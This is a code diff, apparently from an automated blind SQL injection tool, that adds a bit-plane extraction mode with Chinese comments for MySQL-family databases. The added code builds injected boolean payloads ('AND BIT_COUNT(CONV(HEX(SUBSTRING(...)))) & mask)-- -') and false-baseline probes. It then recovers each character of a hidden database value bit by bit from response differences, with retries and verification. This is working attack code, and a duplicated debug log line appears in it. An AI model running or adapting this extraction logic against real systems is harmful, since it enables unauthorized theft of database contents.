@@ -56,6 +56,75 @@ export async function extractBoolean(ex, ctx, expr) {
     const rbCfg = ctx.config?.blindRobust;
     const extractVerify = rbCfg ? rbCfg.extractVerify !== false : defaults.blindRobust.extractVerify !== false;
     const bytes = new Array(len).fill(0);
+
+    // [批次 11 2026-09-15] 位平面提取（opt-in config.blindBitwise === true，默认关零回归）：
+    console.log('[bitwise] entered, cfg.blindBitwise=', ctx.config?.blindBitwise, 'dbms=', resolveDbms(ctx.dbms || 'MySQL'));
+    // BIT_COUNT(CONV(HEX(SUBSTRING(expr,pos,1)),16,10) & mask) 非 0 ⇔ 字节第 bit 位为 1。
+    // 8 位并行 → 每字符 1 轮请求（二分 ~8 轮 / 字符类 ~5 轮）。仅 MySQL/TiDB 族启用；
+    // 判定复用 _dynJudge 通道；8 位收敛后整体等值验证（复用 extractVerify 语义），
+    // 任一字符验证失败 → 整体放弃位平面结果、落回下方原二分路径（保守，零漏提取）。
+    if (ctx.config?.blindBitwise === true && /^(MySQL|MariaDB|TiDB)$/i.test(resolveDbms(ctx.dbms || 'MySQL'))) {
+    console.log('[bitwise] entered, cfg.blindBitwise=', ctx.config?.blindBitwise, 'dbms=', resolveDbms(ctx.dbms || 'MySQL'));
+      const judgeB = _dynJudge(ex, ctx);
+      const bytesB = new Array(len).fill(0);
+      let bitsValid = true;
+      outer: for (let bit = 0; bit < 8 && bitsValid; bit++) {
+        const mask = 1 << bit;
+        let remainingBits = Array.from({ length: len }, (_, i) => i + 1);
+        const errBits = new Array(len + 1).fill(0);
+        while (remainingBits.length) {
+          const batchPos = remainingBits.splice(0, K);
+          const reqs = batchPos.map((pos) =>
+            `${base} AND BIT_COUNT(CONV(HEX(SUBSTRING(${expr},${pos},1)),16,10) & ${mask})-- -`
+          );
+          reqs.push(`${base} AND (1=2)-- -`);
+          const resps = await _sendBatch(ex, ctx, reqs);
+          const falseResp2 = resps[resps.length - 1];
+          if (!falseResp2) {
+            for (const pos of batchPos) {
+              errBits[pos] += 1;
+              if (errBits[pos] <= 3) remainingBits.push(pos);
+              else { bitsValid = false; break outer; }
+            }
+            continue;
+          }
+          judgeB.observe(String(falseResp2?.data ?? ''));
+          const falseData2 = String(falseResp2?.data ?? '');
+          for (let kk = 0; kk < batchPos.length; kk++) {
+            const pos = batchPos[kk];
+            const resp = resps[kk];
+            if (!resp) {
+              errBits[pos] += 1;
+              if (errBits[pos] <= 3) remainingBits.push(pos);
+              else { bitsValid = false; break outer; }
+              continue;
+            }
+            if (String(resp?.data ?? '') !== falseData2) bytesB[pos - 1] |= mask;
+          }
+        }
+      }
+      if (bitsValid) {
+        // 整体等值验证（extractVerify 语义）：每字符 1 次确认，失败即整体回退原路径
+        if (extractVerify) {
+          for (let i = 1; i <= len && bitsValid; i++) {
+            const v = bytesB[i - 1];
+            const resps = await _sendBatch(ex, ctx, [
+              `${base} AND (${asciiFn(subFn(expr, i))}=${v})-- -`,
+              `${base} AND (1=2)-- -`,
+            ]);
+            const fd = String(resps[1]?.data ?? '');
+            if (!resps[0] || String(resps[0]?.data ?? '') === fd) bitsValid = false;
+          }
+        }
+        if (bitsValid) {
+          const decodedB = new TextDecoder('utf-8').decode(new Uint8Array(bytesB));
+          if (ctx) ctx.extractConfidence = ctx.extractConfidence || 'normal';
+          return decodedB; // 位平面成功：跳过下方原二分路径（请求量 ~1/8）
+        }
+        // 回退：重置字节数组，走下方原二分全路径
+        bytes.fill(0);
+      }
+    }
     // [P0-FIX] 动态块感知真值判定（详见 _dynJudge）：收集批内 false 基准做基线
     const judge = _dynJudge(ex, ctx);
     let anyAbandoned = false; // 有字节因重试超限被放弃 → 最终值标低置信
